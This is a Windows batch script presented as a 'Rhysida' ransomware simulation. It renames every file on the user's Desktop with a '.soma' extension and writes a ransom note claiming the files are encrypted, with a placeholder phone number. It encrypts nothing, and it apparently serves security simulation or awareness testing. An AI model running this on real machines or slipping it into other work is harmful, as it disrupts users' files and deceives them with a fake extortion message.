@echo off
set "target=%USERPROFILE%\Desktop"

echo [*] Rhysida Simulation: Encrypting files...
timeout /t 2 >nul

for /r "%target%" %%f in (*) do (
    if /i not "%%~xf"==".bat" (
        if /i not "%%~xf"==".soma" (
            if /i not "%%~nxf"=="soma.txt" (
                ren "%%f" "%%~nxf.soma"
            )
        )
    )
)

echo Your files have been encrypted by Soma. Call: xxx-xxx > "%target%\soma.txt"
echo [+] Encryption Complete.
pause
exit